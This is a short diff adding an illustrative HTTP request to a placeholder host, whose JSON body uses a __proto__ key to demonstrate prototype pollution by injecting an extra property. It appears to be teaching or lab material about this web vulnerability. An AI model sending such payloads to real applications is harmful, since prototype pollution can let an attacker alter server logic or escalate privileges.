@@ -1,0 +1,12 @@
+POST /user/update HTTP/1.1
+Host: vulnerable-website.com
+
+...
+
+{
+    "name":"user",
+    "password":"user123",
+    __proto__:{
+        "meow":"hacker" // injected property
+    }
+}
